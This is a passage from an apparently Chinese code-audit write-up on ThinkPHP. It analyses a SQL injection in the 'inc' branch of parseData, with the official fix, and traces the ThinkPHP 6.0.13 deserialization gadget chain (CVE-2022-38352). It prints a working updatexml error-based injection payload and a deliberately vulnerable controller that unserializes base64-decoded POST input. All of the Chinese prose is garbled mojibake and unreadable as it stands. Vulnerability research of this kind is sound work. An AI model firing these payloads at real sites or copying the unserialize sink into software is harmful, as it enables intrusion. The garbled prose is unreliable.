å‚æ—¶å°±æ˜¯ä¸€ä¸ªæ•°ç»„å‘¢ï¼Ÿè¿˜æ˜¯ç®€å•æ”¹ä¸€ä¸‹é…ç½®å³å¯ï¼š\nç„¶åå†æ¬¡è°ƒè¯•å³å¯ï¼Œä¸åŒçš„ç‚¹åœ¨äºåœ¨è°ƒç”¨input()æ–¹æ³•æ—¶ï¼Œis_arrayå‡½æ•°åˆ¤æ–­æˆåŠŸï¼š\nç„¶åä¼šè°ƒç”¨åˆ°array_walk_recursive()å‡½æ•°ï¼Œå…¶å®å°±æ˜¯ä¼šè°ƒç”¨filterValue()å‡½æ•°ï¼Œç®€å•è·Ÿäº†ä¸€ä¸‹ã€‚è¿‡ç¨‹å…¶å®ä¹Ÿæ˜¯å’Œå‰é¢å·®ä¸å¤šçš„ï¼Œä¸€ä¸ªæ£€æµ‹å€¼çš„æ“ä½œï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚æœ€åè°ƒç”¨reset()å‡½æ•°æ¥è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå€¼ï¼Œä¹Ÿå°±æ˜¯fupancï¼Œå¹¶ä¸”åé¢çš„æ“ä½œä¹Ÿæ˜¯å·®ä¸å¤šçš„ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚\nç„¶åå°±åˆ°äº†æ•°æ®åº“è¿æ¥åŠæ’å…¥æ“ä½œäº†ï¼š\n1 db(\u0026#39;users\u0026#39;)-\u0026gt;insert([\u0026#39;username\u0026#39;=\u0026gt;$username]); è·Ÿè¿›è¿™ä¸ªdb()æ–¹æ³•ï¼š\nè¿™é‡Œæ˜¯è¿æ¥æ•°æ®åº“ï¼Œå¹¶ä¸”æŒ‡å®šäº†æ•°æ®è¡¨ä¸ºusersè¡¨ï¼š\nç„¶åè°ƒç”¨äº†insert()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯è°ƒç”¨äº†parseExpress()æ–¹æ³•ï¼Œè·Ÿäº†ä¸€ä¸‹ï¼Œé‡Œé¢å°±æ˜¯å¯¹optionsè¿™ä¸ªå˜é‡è¿›è¡Œäº†ä¸€ä¸‹å¡«å……æ“ä½œï¼Œåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå…ˆæ˜¯å®šä¹‰äº†ä¸€ä¸ª$optionså˜é‡ï¼Œæ˜¯ä¸€ä¸ªæ•°ç»„ç±»å‹ï¼Œç„¶åå°±æ˜¯å¾€è¿™ä¸ªæ•°ç»„ç±»å‹çš„å˜é‡è¿›è¡Œä¸€äº›å¡«å……ï¼Œé‡Œé¢æœ‰å‡ ä¸ªæ˜¯åé¢è¦æåˆ°çš„ç‚¹ï¼š\nè¿™é‡Œçš„gettable()æ–¹æ³•å¯ä»¥è·å–åˆ°tableçš„åå­—ï¼Œåœ¨è¿™é‡Œå°±æ˜¯usersï¼Œå¹¶ä¸”å°†dataçš„é”®è®¾ç½®ä¸ºäº†ç©ºï¼š\nç„¶ååé¢æœ‰ä¸€ä¸ªforeachæ“ä½œï¼Œå°†é”®ä¸ºfetch_sqlçš„å€¼è®¾ç½®ä¸ºäº†falseï¼š\nç„¶ååœ¨è¿™æ–¹æ³•ä¹‹é—´ï¼Œæ˜¯è¿›è¡Œäº†å¾ˆå¤šçš„å¡«å……ï¼Œæœ€åæ˜¯è¿”å›äº†è¿™ä¸ª$optionå˜é‡ã€‚\né€€å‡ºäº†parseExpress()æ–¹æ³•ï¼Œç„¶åè°ƒç”¨äº†array_merrge()æ–¹æ³•ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ªåˆå¹¶æ•°ç»„çš„æ“ä½œï¼Œä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰åˆå¹¶ï¼Ÿå°æ€ªï¼Œdataçš„å€¼è¿˜æ˜¯æ²¡æœ‰æ”¹å˜ã€‚\nç„¶åè°ƒç”¨äº†insert()å‡½æ•°ï¼Œè¿™é‡Œçš„â€œå‘èµ·è€…â€æ˜¯builderå˜é‡ï¼š\nçœ‹ä¸€ä¸‹builderå˜é‡çš„å®šä¹‰ï¼š\næ˜¯æ•°æ®åº“Builderå¯¹è±¡å®ä¾‹ï¼ŒåŒæ—¶åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ•°æ®åº“Connectionå¯¹è±¡å®ä¾‹ã€‚ç®€å•åŒºåˆ«å°±æ˜¯ï¼š\nConnectionå¯¹è±¡å®ä¾‹æ˜¯è¡¨ç¤ºæ•°æ®åº“çš„è¿æ¥å®ä¾‹ï¼Œå¯ä»¥è¿›è¡Œä¸€äº›ç®€å•çš„SQLæŸ¥è¯¢çš„åŠŸèƒ½ï¼Œä½†æ˜¯éœ€è¦ä¸ºä¸€ä¸ªå®Œæ•´çš„è¯­å¥ã€‚\nbuilderå¯¹è±¡å®ä¾‹ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®åº“çš„æŸ¥è¯¢æ„å»ºå™¨ï¼Œç”¨äºåŠ¨æ€ç”Ÿæˆå¤æ‚çš„SQLè¯­å¥ã€‚\nç„¶åå°±ä¼šè°ƒç”¨åˆ°insert()æ–¹æ³•ï¼š\nè¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªparseData()å‡½æ•°ï¼Œæ­¤æ—¶çš„å‚æ•°ä¼ é€’å¦‚ä¸‹ï¼š\nåœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œåœ¨switchéƒ¨åˆ†å¿…é¡»è¦åŒ¹é…åˆ°ï¼Œä¸ç„¶ä¼šç›´æ¥é€€å‡ºå¯¼è‡´ä¸èƒ½æ‰§è¡Œsqlæ‰§è¡Œæ“ä½œï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 $result = []; foreach ($data as $key =\u0026gt; $val) { $item = $this-\u0026gt;parseKey($key, $options); if (is_object($val) \u0026amp;\u0026amp; method_exists($val, \u0026#39;__toString\u0026#39;)) { // å¯¹è±¡æ•°æ®å†™å…¥ $val = $val-\u0026gt;__toString(); } if (false === strpos($key, \u0026#39;.\u0026#39;) \u0026amp;\u0026amp; !in_array($key, $fields, true)) { if ($options[\u0026#39;strict\u0026#39;]) { throw new Exception(\u0026#39;fields not exists:[\u0026#39; . $key . \u0026#39;]\u0026#39;); } } elseif (is_null($val)) { $result[$item] = \u0026#39;NULL\u0026#39;; } elseif (is_array($val) \u0026amp;\u0026amp; !empty($val)) { switch ($val[0]) { case \u0026#39;exp\u0026#39;: $result[$item] = $val[1]; break; case \u0026#39;inc\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;+\u0026#39; . floatval($val[2]); break; case \u0026#39;dec\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;-\u0026#39; . floatval($val[2]); break; } } elseif (is_scalar($val)) { // è¿‡æ»¤éæ ‡é‡æ•°æ® if (0 === strpos($val, \u0026#39;:\u0026#39;) \u0026amp;\u0026amp; $this-\u0026gt;query-\u0026gt;isBind(substr($val, 1))) { $result[$item] = $val; } else { $key = str_replace(\u0026#39;.\u0026#39;, \u0026#39;_\u0026#39;, $key); $this-\u0026gt;query-\u0026gt;bind(\u0026#39;data__\u0026#39; . $key, $val, isset($bind[$key]) ? $bind[$key] : PDO::PARAM_STR); $result[$item] = \u0026#39;:data__\u0026#39; . $key; } } } return $result; è¿™é‡Œè°ƒç”¨çš„foreachï¼Œä¼šåŒ¹é…åˆ°val[0]ï¼Œä¹Ÿå°±æ˜¯fupancè¿™ä¸ªå€¼ï¼Œåé¢ä¼šè¿›å…¥åˆ°switchçš„è¯­å¥ä¸­ï¼Œç„¶åå°±ä¼šè¿›è¡ŒswitchåŒ¹é…ï¼Œå¦‚æœè¿™é‡Œä¸å‘¢ä¸ªåŒ¹é…åˆ°ï¼Œåé¢ç”±äºis_scalarå‡½æ•°åŒ¹é…æ ‡é‡ï¼Œä¸ä¼šè¿›å…¥ï¼Œå°±ä¼šç›´æ¥è¿”å›ä¸€ä¸ªç©ºæ•°ç»„ï¼ˆ$resultï¼‰ï¼Œç„¶åå†insert()å‡½æ•°ä¸­ç›´æ¥return 0äº†ï¼š\n1 2 3 4 $data = $this-\u0026gt;parseData($data, $options); if (empty($data)) { return 0; } å°±ä¸ä¼šæœ‰åé¢çš„æ›¿æ¢æ“ä½œè¿”å›ä¸€ä¸ªæ­£å¸¸çš„sqlè¯­å¥äº†ã€‚\nè€Œè¿”å›äº†ä¸€ä¸ª0è¿‡åå‘¢ï¼Œå°±ä¸èƒ½æ‰§ä»»ä½•sqlè¯­å¥äº†ï¼š\nå‰é¢çš„åœ¨å¡«å……optionæ—¶æ ‡æ³¨ä¸ºäº†falseï¼Œå‰é¢æåˆ°äº†ï¼Œç„¶åè¿™é‡Œç”±äºresultä¸º0ï¼Œç›´æ¥å°±ä¸ä¼šæ‰§è¡Œåç»­æ“ä½œäº†ã€‚å¯¼è‡´æœ€åçš„sqlè¯­å¥æ’å…¥æ˜¯æ²¡ç”¨çš„ã€‚\nç°åœ¨å†æ¥ä»”ç»†çœ‹ä¸€ä¸‹è¿™ä¸ªPOC:\n1 ?username[0]=inc\u0026amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)\u0026amp;username[2]=1 è¿™é‡Œçš„ä¼ å‚æ˜¯åŠ ä¸Šäº†ä¸€ä¸ªincçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè½¬æŠ˜ç‚¹å°±æ˜¯åœ¨switchè¯­å¥ï¼Œè¿™é‡Œå†çœ‹çœ‹switchçš„ä»£ç é€»è¾‘ï¼š\n1 2 3 4 5 6 7 8 9 10 switch ($val[0]) { case \u0026#39;exp\u0026#39;: $result[$item] = $val[1]; break; case \u0026#39;inc\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;+\u0026#39; . floatval($val[2]); break; case \u0026#39;dec\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;-\u0026#39; . floatval($val[2]); break; è¿™é‡Œä¼šåŒ¹é…val[0]çš„å€¼ï¼Œå€¼çš„èµ‹äºˆæ˜¯å‰é¢æåˆ°äº†çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœä¼ å‚å¦‚ä¸‹ï¼š\n1 username[0]=1\u0026amp;username[1]=2 é‚£ä¹ˆè¿™é‡Œçš„valçš„å€¼å°±æ˜¯åŒ…å«åˆ°1å’Œ2ä¸¤ä¸ªå€¼çš„æ•°ç»„ï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œï¼Œå¯ä»¥å°è¯•ä¼ å‚ï¼š\n1 username[0]=exp\u0026amp;username[1]=fupanc å†çœ‹çœ‹æƒ…å†µå‘¢ï¼Œè¿˜æ˜¯è¿›ä¸å»ï¼Œè¿™é‡Œè¾“å‡ºä¸ºï¼š\nåœ¨expåé¢ä¼¼ä¹å¤šäº†ä¸€ä¸ªç©ºæ ¼ï¼Œphpstorrmçš„é—®é¢˜ï¼Ÿ\né‚£ä¹ˆåœ¨ç½‘é¡µä¸Šä¼ å‚è¯•è¯•å‘¢ï¼Œè¿˜æ˜¯ä¸è¡Œå‘¢ã€‚\né‚£ä¹ˆæœ€åå†è°ƒè¯•ä¸€ä¸‹POCï¼š\n1 ?username[0]=inc\u0026amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)\u0026amp;username[2]=1 è¿™ä¸‹åˆå®Œå…¨æ­£ç¡®äº†ï¼š\nè¿™ã€‚ã€‚ã€‚\né‚£å°±çœ‹è¿™ä¸ªå§ï¼Œåœ¨caseä¸­åˆ©ç”¨åˆ°çš„å‡½æ•°å¦‚ä¸‹ï¼š\n1 2 3 case \u0026#39;inc\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;+\u0026#39; . floatval($val[2]); break; è¿™é‡Œçš„parseKey()å‡½æ•°æœ€åå…¶å®è¿”å›çš„å°±æ˜¯ä¼ è¿›å»çš„å€¼ï¼Œè€Œfloatval()å‡½æ•°åˆ™æ˜¯å°†å…¶è½¬æ¢ä¸ºæµ®ç‚¹å‹ï¼Œæœ€åç›¸åŠ ï¼Œç»“æœå¦‚ä¸‹ï¼š\nè¿”å›çš„resultä¸ä¸ºç©ºäº†ï¼Œå›åˆ°insert()å‡½æ•°ï¼Œç„¶åè°ƒç”¨äº†array_keyså’Œarray_valueså‡½æ•°æ¥åˆ†åˆ«ç”Ÿæˆkeyå’Œvalueçš„æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯å‰é¢resultä¸­çš„å€¼ï¼Œç„¶åè¿›è¡Œäº†æ›¿æ¢æ“ä½œï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $fields = array_keys($data); $values = array_values($data); $sql = str_replace( [\u0026#39;%INSERT%\u0026#39;, \u0026#39;%TABLE%\u0026#39;, \u0026#39;%FIELD%\u0026#39;, \u0026#39;%DATA%\u0026#39;, \u0026#39;%COMMENT%\u0026#39;], [ $replace ? \u0026#39;REPLACE\u0026#39; : \u0026#39;INSERT\u0026#39;, $this-\u0026gt;parseTable($options[\u0026#39;table\u0026#39;], $options), implode(\u0026#39; , \u0026#39;, $fields), implode(\u0026#39; , \u0026#39;, $values), $this-\u0026gt;parseComment($options[\u0026#39;comment\u0026#39;]), ], $this-\u0026gt;insertSql); return $sql; æœ€åçš„sqlè¯­å¥ä¸ºï¼š\n1 INSERT INTO `users` (`username`) VALUES (updatexml(1,concat(0x7e,user(),0x7e),1)+1) æœ€åæˆåŠŸæ‰§è¡Œï¼š\næˆåŠŸè¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼š\nâ€”â€”â€”â€”â€”â€”\nä¿®å¤æ–¹æ¡ˆ å®˜æ–¹çš„ä¿®å¤æ–¹æ¡ˆæ˜¯ä¿®æ”¹switchè¯­å¥çš„é€»è¾‘ï¼š\n1 2 3 4 5 6 7 8 9 10 11 switch (strtolower($val[0])) { case \u0026#39;inc\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;+\u0026#39; . floatval($val[2]); break; case \u0026#39;dec\u0026#39;: $result[$item] = $this-\u0026gt;parseKey($val[1]) . \u0026#39;-\u0026#39; . floatval($val[2]); break; case \u0026#39;exp\u0026#39;: $result[$item] = $val[1]; break; } æ€»ç»“ ç¬¬ä¸€æ¬¡å®¡ä¸‹æ¥ï¼Œç¡®å®ä»£ç å®¡è®¡éœ€è¦æ¯”è¾ƒç»†å¿ƒå‘€ï¼Œæœ‰äº›æ—¶å€™å°±æ˜¯ä¸€äº›ä¼ å‚å°±èƒ½è¾¾åˆ°æ³¨å…¥çš„æ•ˆæœï¼Œè¿˜æœ‰éœ€è¦æ³¨æ„ä»£ç ä¹‹é—´çš„è”ç³»ï¼Œæœ‰äº›æ—¶å€™åœ¨ä»£ç çš„ååŠæ®µä¼šæœ‰æ¯”è¾ƒé‡è¦çš„ä»£ç é€»è¾‘ä½“ç°ï¼Œè¿˜æ˜¯å¤šåŠ æ³¨æ„ã€‚\nThinkphp v6.0.13ååºåˆ—åŒ–æ¼æ´ CVE-2022-38352\nç¯å¢ƒæ­å»º å’Œä¹‹å‰æœ‰ç‚¹ä¸ä¸€æ ·äº†ï¼Œthinkphp6ä»¥ä¸Šå°±åªæœ‰ä½¿ç”¨composeræ¥å®‰è£…äº†ï¼Œæ¯”å¦‚è¿™é‡Œçš„ä½¿ç”¨æ–¹æ³•æ˜¯ï¼š\n1 2 composer create-project topthink/think=6.0.13 think-6.0.13 //ç®€å•è§£æä¸€ä¸‹ï¼Œè¿™é‡Œå°±æ˜¯æŒ‡å®šäº†thinkphpçš„ç‰ˆæœ¬ï¼Œç„¶åè¿™é‡Œçš„tp6å°±æ˜¯å°†æºç ä¸‹è½½åœ¨å½“å‰ç›®å½•çš„tp6ç›®å½•ä¸‹ å¦‚æœæœ‰æŠ¥é”™çš„è¯ä¸€èˆ¬å°±æ˜¯php.inié…ç½®æ–‡ä»¶æœ‰äº›é…ç½®éœ€è¦ä¿®æ”¹ï¼Œæ¯”å¦‚éœ€è¦å¼€å¯zipçš„é…ç½®ç­‰ï¼Œå…¶å®é—®AIéƒ½èƒ½é—®å‡ºæ¥ã€‚\nç„¶åè®¿é—®ç½‘ç«™çš„public/index.phpï¼Œå¦‚æœæŠ¥é”™Your Composer dependencies require a PHP version â€œï¼= 7.4.0ï¼Œé‚£ä¹ˆå°±éœ€è¦æ”¹ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼š\n1 2 3 \u0026#34;config\u0026#34;:{ \u0026#34;platform-check\u0026#34;: false } æ­¤æ—¶æ­å»ºæˆåŠŸï¼Œä½†æ˜¯ä¼šå‘ç°ç‰ˆæœ¬ä¸å¯¹ï¼Œæ‰€ä»¥éœ€è¦\nè¿˜æ˜¯æ”¹é…ç½®ï¼Œåœ¨frameworkè¿™é‡Œç›´æ¥æŒ‡å®šç‰ˆæœ¬ï¼š\n1 2 3 4 5 \u0026#34;require\u0026#34;: { \u0026#34;php\u0026#34;: \u0026#34;\u0026gt;=7.2.5\u0026#34;, \u0026#34;topthink/framework\u0026#34;: \u0026#34;6.0.13\u0026#34;, \u0026#34;topthink/think-orm\u0026#34;: \u0026#34;^2.0\u0026#34; }, ç„¶åå†ä½¿ç”¨composerr updateå³å¯ï¼Œæœ€åæˆåŠŸæ­å»ºï¼š\nä¸‹è½½æ¥çš„æºç å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„phpç‰ˆæœ¬è¦æ±‚æ˜¯å¤§äºç­‰äº7.2.5çš„ï¼Œè¿™é‡Œè¿˜æ˜¯ç›´æ¥ä½¿ç”¨å‰é¢çš„7.3.4å³å¯ã€‚\nç„¶ååœ¨app\\controller\\Index.phpæ–‡ä»¶ä¸­åŠ ä¸Šå…¥å£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php namespace app\\controller; use app\\BaseController; class Index extends BaseController { public function index() { if($_POST[\u0026#34;a\u0026#34;]){ unserialize(base64_decode($_POST[\u0026#34;a\u0026#34;])); } return \u0026#39;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: \u0026#34;Century Gothic\u0026#34;,\u0026#34;Microsoft yahei\u0026#34;; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }\u0026lt;/style\u0026gt;\u0026lt;div style=\u0026#34;padding: 24px 48px;\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;:) \u0026lt;/h1\u0026gt;\u0026lt;p\u0026gt; ThinkPHP V\u0026#39; . \\think\\facade\\App::version() . \u0026#39;\u0026lt;br/\u0026gt;\u0026lt;span style=\u0026#34;font-size:30px;\u0026#34;\u0026gt;16è½½åˆå¿ƒä¸æ”¹ - ä½ å€¼å¾—ä¿¡èµ–çš„PHPæ¡†æ¶\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt;\u0026lt;span style=\u0026#34;font-size:25px;\u0026#34;\u0026gt;[ V6.0 ç‰ˆæœ¬ç”± \u0026lt;a href=\u0026#34;https://www.yisu.com/\u0026#34; target=\u0026#34;yisu\u0026#34;\u0026gt;äº¿é€Ÿäº‘\u0026lt;/a\u0026gt; ç‹¬å®¶èµåŠ©å‘å¸ƒ ]\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://e.topthink.com/Public/static/client.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;think id=\u0026#34;ee9b1aa918103c4fc\u0026#34;\u0026gt;\u0026lt;/think\u0026gt;\u0026#39;; } public function hello($name = \u0026#39;ThinkPHP6\u0026#39;) { return \u0026#39;hello,\u0026#39; . $name; } } ä»£ç å®¡è®¡åˆ†æ ååºåˆ—åŒ–ï¼Œä¸€èˆ¬éƒ½æ˜¯ä»__destructæˆ–è€…__wakeupå…¥æ‰‹çš„ï¼Œè¿™é‡Œè¿˜æ˜¯ä»__destructæ–¹æ³•å…¥æ‰‹ï¼Œç›´æ¥å…¨å±€æœç´¢è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¦‚ä¸‹å‡ ä¸ªé€»è¾‘ï¼š\næœåˆ°äº†å¦‚ä¸Šå‡ ä¸ªæ–¹æ³•ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰å¦‚ä¸‹çš„ä¸¤ä¸ªç‚¹å¯èƒ½å­˜åœ¨åˆ©ç”¨ï¼š\nLeague\\Flysystem\\Cached\\Storage\\AbstractCache ï¼š\n1 2 3 4 5 6 public function __destruct() { if (! $this-\u0026gt;autosave) { $this-\u0026gt;save(); } } think\\Model ï¼š\n1 2 3 4 5 6 public function __destruct() { if ($this-\u0026gt;lazySave) { $this-\u0026gt;save(); } } çœ‹å‚è€ƒæ–‡ç« çš„å…¥æ‰‹ç‚¹æ˜¯AbstractCacheæŠ½è±¡ç±»çš„æ–¹æ³•ï¼Œæ‰€ä»¥å°±æ˜¯ç¬¬äºŒä¸ªdestruct()æ–¹æ³•ï¼Œç®€å•è·Ÿä¸€ä¸‹ã€‚\nlazySaveå°±æ˜¯ç±»çš„ä¸€ä¸ªå˜é‡ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å¯ä»¥èµ‹å€¼ä¸ºä»»æ„å€¼ï¼Œè·Ÿè¿›è°ƒç”¨çš„save()æ–¹æ³•ï¼Œè¿™é‡Œçš„AbstractCacheç±»æ˜¯æŠ½è±¡ç±»ï¼Œæ‰€ä»¥æ˜¯å¿…ç„¶æœ‰save()æ–¹æ³•çš„å®ç°äº†ï¼ŒAbstractCacheç±»çš„å®ç°ç±»æœ‰å¦‚ä¸‹å‡ ä¸ªï¼š\nè¿™é‡Œçš„é“¾å­æ˜¯éœ€è¦è°ƒç”¨åˆ°League\\Flysystem\\Cached\\Storage\\Psr6Cacheçš„save()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 public function save() { $item = $this-\u0026gt;pool-\u0026gt;getItem($this-\u0026gt;key); $item-\u0026gt;set($this-\u0026gt;getForStorage()); $item-\u0026gt;expiresAfter($this-\u0026gt;expire); $this-\u0026gt;pool-\u0026gt;save($item); } ä¸æ˜¯å¾ˆæ¸…æ¥šè¿™é‡Œï¼Œç¡®å®ä¼šæ‰¾å­ç±»çš„save()æ–¹æ³•çš„å®ç°ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™é‡Œå°±æ˜¯è°ƒç”¨çš„è¿™ä¸ªç±»çš„save()æ–¹æ³•ï¼Œå…ˆä¸ç®¡ï¼Œè·Ÿä¸€ä¸‹é“¾å­ï¼Œåé¢åˆ†æä¸€ä¸‹ç”Ÿæˆé€»è¾‘ã€‚\né“¾å­åé¢ä¼šå†æ¬¡è°ƒç”¨åˆ°__call()æ–¹æ³•ï¼Œåªè¦å°†è¿™ä¸ªç†çš„$this-\u0026gt;poolè®¾ç½®ä¸ºä¸€ä¸ªç±»å³å¯ï¼Œè¿™é‡Œé€‰ç”¨çš„æ˜¯think\\log\\Channelç±»çš„__call()æ–¹æ³•ï¼š\n1 2 3 4 public function __call($method, $parameters) { $this-\u0026gt;log($method, ...$parameters); } å‚æ•°ä¼ é€’çš„è¯ï¼Œè¿™é‡Œçš„$methodæ˜¯getItem()æ–¹æ³•åï¼Œè€Œ$parameterså°±æ˜¯å‰é¢ä¼ çš„$this-\u0026gt;keyï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªpoolå’Œkeyéƒ½æ˜¯ç±»å®šä¹‰çš„å˜é‡ï¼Œæ‰€ä»¥è¿™é‡Œéƒ½æ˜¯å¯æ§çš„ã€‚ç„¶åè·Ÿè¿›log()æ–¹æ³•ï¼Œä¼šè°ƒç”¨record()æ–¹æ³•ï¼š\n1 2 3 4 public function log($level, $message, array $context = []) { $this-\u0026gt;record($message, $level, $context); } ç„¶åå†è·Ÿè¿›record()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 public function record($msg, string $type = \u0026#39;info\u0026#39;, array $context = [], bool $lazy = true) { if ($this-\u0026gt;close || (!empty($this-\u0026gt;allow) \u0026amp;\u0026amp; !in_array($type, $this-\u0026gt;allow))) { return $this; } if (is_string($msg) \u0026amp;\u0026amp; !empty($context)) { $replace = []; foreach ($context as $key =\u0026gt; $val) { $replace[\u0026#39;{\u0026#39; . $key . \u0026#39;}\u0026#39;] = $val; } $msg = strtr($msg, $replace); } if (!empty($msg) || 0 === $msg) { $this-\u0026gt;log[$type][] = $msg; if ($this-\u0026gt;event) { $this-\u0026gt;event-\u0026gt;trigger(new LogRecord($type, $msg)); } } if (!$this-\u0026gt;lazy || !$lazy) { $this-\u0026gt;save(); } return $this; } ç»§ç»­çœ‹é“¾å­ï¼Œåœ¨record()æ–¹æ³•ä¸­ï¼Œä¸»è¦è¿˜æ˜¯ä¸ºäº†è°ƒç”¨æœ€åçš„save()æ–¹æ³•ï¼Œç®€å•çœ‹ä¸€ä¸‹å‰é¢çš„ä»£ç ï¼Œçœ‹æ˜¯å¦å¯ä»¥å®ç°è°ƒç”¨save()æ–¹æ³•ï¼š\nå‰é¢æ€»çš„æ¥è¯´æ˜¯éœ€è¦é€šè¿‡ä¸‰ä¸ªifæ¡ä»¶ï¼Œ\nç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼š 1 2 3 if ($this-\u0026gt;close || (!empty($this-\u0026gt;allow) \u0026amp;\u0026amp; !in_array($type, $this-\u0026gt;allow))) { return $this; } å°±æ˜¯éœ€è¦$this-\u0026gt;closeä¸ºfalseï¼Œç„¶ååé¢çš„allowå®šä¹‰æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä»ä»£ç é€»è¾‘æ¥çœ‹ï¼Œè¦ä¹ˆè¿™ä¸ªæ•°ç»„ä¸ºç©ºï¼Œè¦ä¹ˆè¿™ä¸ªæ•°ç»„é‡Œé¢å­˜åœ¨getItemè¿™ä¸ªå€¼ï¼Œå°±ä¸ä¼šè¿›å…¥è¿™ä¸ªifè¯­å¥ã€‚\nç¬¬äºŒä¸ªifæ¡ä»¶ï¼š 1 2 3 4 5 6 7 8 if (is_string($msg) \u0026amp;\u0026amp; !empty($context)) { $replace = []; foreach ($context as $key =\u0026gt; $val) { $replace[\u0026#39;{\u0026#39; . $key . \u0026#39;}\u0026#39;] = $val; } $msg = strtr($msg, $replace); } åˆ¤æ–­$msgæ˜¯å¦ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œç„¶ååˆ¤æ–­$contextå˜é‡æ˜¯å¦ä¸ºç©ºï¼Œè¿™ä¸ª$msgçš„å€¼æ˜¯å¯æ§çš„ï¼Œè€Œä¸”ä»record()å‡½æ•°çš„å½¢å‚æ¥çœ‹ï¼Œè¿™é‡Œçš„$contextå˜é‡å°±æ˜¯ä¸€ä¸ªç©ºå€¼ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªifæ¡ä»¶åº”è¯¥æ˜¯ä¸ä¼šè¿›å…¥çš„ã€‚\nç¬¬ä¸‰ä¸ªifæ¡ä»¶ï¼š 1 2 3 4 5 6 if (!empty($msg) || 0 === $msg) { $this-\u0026gt;log[$type][] = $msg; if ($this-\u0026gt;event) { $this-\u0026gt;event-\u0026gt;trigger(new LogRecord($type, $msg)); } } è¿™é‡Œ$msgä¸ä¸ºç©ºï¼Œå°±å¯ä»¥è¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼ŒåŒæ ·å¯ä»¥æ§åˆ¶åˆ°ä¸è¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼Œä½†æ˜¯è¿™é‡Œè¿˜ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ï¼Œå…ˆä¸ç®¡ã€‚\næœ€ååˆ°äº†è°ƒç”¨save()æ–¹æ³•çš„ifè¯­å¥ï¼š 1 2 3 if (!$this-\u0026gt;lazy || !$lazy) { $this-\u0026gt;save(); } è¿™é‡Œçš„$this-\u0026gt;lazyå˜é‡æ˜¯ç±»å˜é‡ï¼Œå¯ä»¥æ§åˆ¶ã€‚\né‚£ä¹ˆç°åœ¨æ¥çœ‹save()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public function save(): bool { $log = $this-\u0026gt;log; if ($this-\u0026gt;event) { $event = new LogWrite($this-\u0026gt;name, $log); $this-\u0026gt;event-\u0026gt;trigger($event); $log = $event-\u0026gt;log; } if ($this-\u0026gt;logger-\u0026gt;save($log)) { $this-\u0026gt;clear(); return true; } return false; } 